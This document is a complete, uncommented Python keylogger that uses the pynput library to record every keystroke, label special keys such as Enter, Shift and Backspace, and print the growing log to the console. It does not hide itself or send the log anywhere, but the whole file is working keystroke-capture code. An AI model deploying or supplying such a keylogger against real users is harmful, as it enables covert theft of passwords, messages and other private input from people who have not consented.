#!/usr/bin/env python3
import pynput.keyboard

log = ""

def pressed_key(key):
    global log

    try:
        log += str(key.char)
    except AttributeError:
        special_keys = {key.space: " ", key.backspace: " [Backspace] ", key.enter: " [Enter] ", key.shift: " [Shift] ", key.ctrl: " [Ctrl] ", key.alt: " [Alt] "}
        log += special_keys.get(key, f" {str(key)} ")

    print(log)

keyboard_listener = pynput.keyboard.Listener(on_press=pressed_key)

with keyboard_listener:
    keyboard_listener.join()

